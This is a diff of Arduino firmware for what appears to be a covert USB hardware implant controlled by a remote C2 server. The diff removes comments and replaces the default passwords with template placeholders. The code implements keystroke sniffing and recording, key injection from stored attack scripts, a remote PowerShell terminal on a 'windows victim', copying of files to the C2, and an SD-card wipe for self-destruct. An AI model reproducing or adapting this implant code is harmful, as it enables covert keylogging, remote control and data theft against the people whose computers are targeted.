@@ -37,35 +37,32 @@ unsigned long currentMillis;
 unsigned long elapsedMillis;
 
 //password variables
-// these must match what is in ihide.py or your devices will not communicate
-// default values have been added below for out-of-the-box functionality
-// WARNING: if you do not change these variables, an attacker can potentially detect and hijack your implant
-String activatePW = "DEFAULTactivatePW";            //password for activating implant functions                             - main menu option 3
-String getModesPW = "DEFAULTgetModesPW";            //password for retrieving the status of insomnia and key recorder modes - main menu option 4
-String recKeysEnablePW = "DEFAULTrecKeysEnablePW";  //password for enabling keystroke recording                             - main menu option 8
-String recKeysDisablePW = "DEFAULTrecKeysDisablePW";//password for disabling keystroke recording                            - main menu option 9
-String txKeysPW = "DEFAULTtxKeysPW";                //password for sniffing keystrokes                                      - main menu option 5
-String disableKeyTxPW = "DEFAULTdisableKeyTxPW";    //password for disabling sniffing keystrokes                            - main menu option 5
-String insomniaPW = "DEFAULTinsomniaPW";            //password for enabling insomnia mode                                   - main menu option 6
-String allowSleepPW = "DEFAULTallowSleepPW";        //password for disabling insomnia mode                                  - main menu option 7
-String goDarkPW = "DEFAULTgoDarkPW";                //password for wiping SD card - go dark mode                            - main menu option 11
-String injectPW = "DEFAULTinjectPW";                //password to enable key injection, run script from SD                  - main menu option 14
-String rxScriptPW = "DEFAULTrxScriptPW";            //password to transfer an attack script from C2 to SD                   - main menu option 15
-String resetPW = "DEFAULTresetPW";                  //password to reset all variables back to default                       - main menu option 18
-String deletePW = "DEFAULTdeletePW";                //password to delete a file on the SD card of a target implant          - main menu option 17
-String sendKeysPW = "DEFAULTsendKeysPW";            //password for downloading keystroke recording file from SD to C2       - main menu option 10
-String printFilesPW = "DEFAULTprintFilesPW";        //password to print a list of the files on the SD card                  - main menu option 12
-String terminalPW = "DEFAULTterminalPW";            //password for starting a remote powershell terminal on windows victim  - main menu option 16 
-String terminalPWOFF = "DEFAULTterminalPWOFF";      //password for ending a remote powershell terminal on windows victim    - main menu option 16
-String exfilPW = "DEFAULTexfilPW";                  //password for copying files from a windows victim to the C2            - main menu option 13
-String exfilPWOFF = "DEFAULTexfilPWOFF";            //password for ending copying files from a windows victim to the C2     - main menu option 13
+String activatePW = "<<EXFIL_OFF_PASSWORD>>";
+String getModesPW = "<<EXFIL_OFF_PASSWORD>>";
+String recKeysEnablePW = "<<EXFIL_OFF_PASSWORD>>";
+String recKeysDisablePW = "<<EXFIL_OFF_PASSWORD>>";
+String txKeysPW = "<<EXFIL_OFF_PASSWORD>>";
+String disableKeyTxPW = "<<EXFIL_OFF_PASSWORD>>";
+String insomniaPW = "<<EXFIL_OFF_PASSWORD>>";
+String allowSleepPW = "<<EXFIL_OFF_PASSWORD>>";
+String goDarkPW = "<<EXFIL_OFF_PASSWORD>>";
+String injectPW = "<<EXFIL_OFF_PASSWORD>>";
+String rxScriptPW = "<<EXFIL_OFF_PASSWORD>>";
+String resetPW = "<<EXFIL_OFF_PASSWORD>>";
+String deletePW = "<<EXFIL_OFF_PASSWORD>>";
+String sendKeysPW = "<<EXFIL_OFF_PASSWORD>>";
+String printFilesPW = "<<EXFIL_OFF_PASSWORD>>";
+String terminalPW = "<<EXFIL_OFF_PASSWORD>>";
+String terminalPWOFF = "<<TERMINAL_OFF_PASSWORD>>";
+String exfilPW = "<<EXFIL_OFF_PASSWORD>>";
+String exfilPWOFF = "<<EXFIL_OFF_PASSWORD>>";
 
 //Toggle variables
-bool activate = false; // allow outgoing communication with C2 but do not accept commands until activated via C2 menu with the proper password
-bool txKeys = false;   // do not sniff keystrokes until activated
-bool insomnia = false; // default to insomnia mode off until activated
-bool record = false;   // do not record keystrokes to SD card until activated
-bool keyinject = false; 
+bool activate = false; //allow outgoing communication with C2
+bool txKeys = false;
+bool insomnia = false;
+bool record = false;
+bool keyinject = false;
 bool exfil = false;
 bool rxScript = false;
 bool rxScriptName = false;
@@ -120,7 +117,7 @@ uint8_t params2bin(char *buf, uint8_t *outbuf, uint8_t outbuf_len)
 }
 
 void loop() {   
-    // if terminalMode is active, invoke a powershell terminal via com port and connect it to the C2
+
     if (terminalMode) {
         if (Serial.available() > 0) {
         incoming1 = Serial.readString();
@@ -209,7 +206,6 @@ void loop() {
               oldKeys[i] = newKeys[i];
             }
             if (txKeys){
-              // sniffing keystrokes is enabled, transmit back to the C2 and count each key press
               txKeyPresses(newKeys, newKeys_Count);
             }
             HID().SendReport(2, rawdata, sizeof(KeyReport));
@@ -235,17 +231,15 @@ void loop() {
   if (Serial1.available()) {
     incoming = Serial1.readString();
     Serial.println(incoming);
-    // if activate == false, the implant will ignore all commands until the matching activatePW is provided
     if (activate) {
       //only allow functionality if activated by C2
       setMode(incoming);
     } else if (incoming == activatePW) {
-      // if activatePW matches, set activate to true and begin interactive mode
       activate = true;
       Serial.println("Activate is set true");
     }
   }
-  // if insomnia mode is activated, move the mouse one pixel, then move it back one pixel so the mouse does not drift over time
+
   if (insomnia) {
     Mouse.begin();
     Mouse.move(1, 0);
@@ -298,31 +292,24 @@ void setMode(String pass){
   }else if (pass == getModesPW) {
     getModes();
   }else if (pass == recKeysEnablePW){
-    // set record to true to enable keystroke recording mode and write captured keystrokes to a txt file on the SD card
     Serial.println("Record Keys Enabled");
     record = true;
   }else if (pass == recKeysDisablePW){
-    // set record to false to disable keystroke recording mode
     Serial.println("Record Keys Disabled");
     record = false;
   }else if (pass == txKeysPW){
-    // set txKeys to true to enable keystroke sniffing and transmitting of live key presses back to the C2
     Serial.println("Transmit Keys Enabled");
     txKeys = true;
   }else if (pass == disableKeyTxPW){
-    // set txKeys to false to disable keystroke sniffing and transmitting of live key presses back to the C2
     Serial.println("Transmit Keys Disabled");
     txKeys = false;
   }else if (pass == insomniaPW){
-    // set insomnia to true to enable insomnia mode where the mouse if moved periodically to prevent screen saver
     Serial.println("Insomnia Enabled");
     insomnia = true;
   }else if (pass == allowSleepPW){
-    // set insomnia to false to disable insomnia mode
     Serial.println("Insomnia Disabled");
     insomnia = false;
   }else if (pass == goDarkPW){
-    // self destruct mode resets all variables to default values and wipes the SD card
     Serial.println("Wipe card and go into dark mode");
     reset();
     getWipe();
@@ -336,11 +323,9 @@ void setMode(String pass){
     keyinject = true;
 
   }else if (pass == rxScriptPW){
-    // initiate receiving a file from the C2 to write locally to the SD card for later execution on the victim machine
     Serial.println("Receive Script enabled");
     rxScriptName = true;
   }else if (pass == deletePW){
-    // delete a file from the SD card
     Serial.println("Deleting File mode enabled");
     File root = SD.open("/");
     String rootDir = "/";
@@ -349,8 +334,7 @@ void setMode(String pass){
     Serial1.flush();
     deleteScript = true; 
   }else if (pass == sendKeysPW){
-    // send the keys.txt file of recorded keystrokes from the SD card to the C2
-    Serial.println("Send key recording data from SD to C2 Enabled");
+    Serial.println("Send key record data Enabled");
     File root = SD.open("/Data/");
     String rootDir = "/";
     printScripts(root, rootDir);
@@ -358,7 +342,6 @@ void setMode(String pass){
     Serial1.flush();
     sendKeyFile = true;
   }else if (pass == printFilesPW){
-    // get a list of the files on the SD card and send it back to the C2
     Serial.println("Send list of SD card contents");
     File root = SD.open("/");
     String rootDir = "/";
@@ -368,7 +351,6 @@ void setMode(String pass){
   }
    
    else if (pass == terminalPW){
-    // set terminalMode to true to initiate a remote powershell terminal on a windows victim
     Serial.println("TERMINAL");
     terminalMode = true;
     Serial1.println("<<<End of Message>>>");
@@ -376,13 +358,11 @@ void setMode(String pass){
     }
 
    else if (pass == terminalPWOFF){
-    // exit gracefully from remote terminal mode if the function crashes or user CTRL+C
     Serial.println("TERMINAL OFF");
     terminalMode = false;
     Serial1.flush();
     }
      else if (pass == exfilPW){
-    // launch a powershell script that allows remote file browsing and exfil to C2 of files on a windows victim
     Serial.println("EXFIL ON");
     exfilStartVar = true;
     Serial1.flush();
@@ -394,7 +374,6 @@ void setMode(String pass){
       }
 
    else if (pass == exfilPWOFF){
-    // exit gracefully from exfil mode if the function crashes or the user CTRL+C
     Serial.println("EXFIL OFF");
     exfilMode = false;
     exfilStartVar = false;
@@ -403,18 +382,12 @@ void setMode(String pass){
  
 }
 
-//
-// getWipe() is called during self destruct mode and calls wipeCard() to wipe the SD card
-//
 void getWipe(){
   File root = SD.open("/");
   String rootDir = "/";
   wipeCard(root, "/");
 }
 
-//
-// wipeCard() is called during self destruct mode and deletes all files and directories on the SD card
-//
 void wipeCard(File dir, String d) {
   while (true) {
     String dirname = d;
@@ -468,9 +441,7 @@ inject("dl-500");
 
 }
 
-//
-// recordKeys() writes recorded keystrokes to SDCard/Data/keys.txt when keystroke recording is enabled
-//
+
 void recordKeys(String d){
   if (SD.exists("/Data/") == false){
     SD.mkdir("/Data/");
@@ -613,9 +584,6 @@ void inject(String s){
   return;
 }
 
-//
-// getModes() will return the current status of key recorder mode and insomnia mode
-//
 void getModes(){
   if (record){
     Serial.println("Key recorder mode: active");
@@ -640,9 +608,8 @@ void getModes(){
   Serial1.println("<<<End of Message>>>");
 }
 
-//
-// saveScript() writes a received script file to /SCRIPTS/ directory on the SD card
-//
+
+
 void saveScript(String n, String s){
   if (SD.exists("/SCRIPTS/") == false){
     SD.mkdir("/Scripts/");
@@ -662,11 +629,9 @@ void saveScript(String n, String s){
   }
 }
 
-//
-// reset() sets all variables to false to get out of any loop that it may be stuck in
-// it is also called during self-destruct mode to reset all variables to default
-//
+
 void reset(){
+//resets all toggles to get out of any loop that it may be stuck in
 activate = false; //allow outgoing communication with C2
 txKeys = false;
 insomnia = false;
@@ -1248,9 +1213,7 @@ bool getShift(byte m){
   return output;  
 }
 
-//
-// txKeyPresses() sends keystrokes back to the C2 as they are observed when sniffing keystrokes mode is enabled
-//
+
 void txKeyPresses(byte txArray[81], byte count){
   byte modVal = 0;
   String message = "";
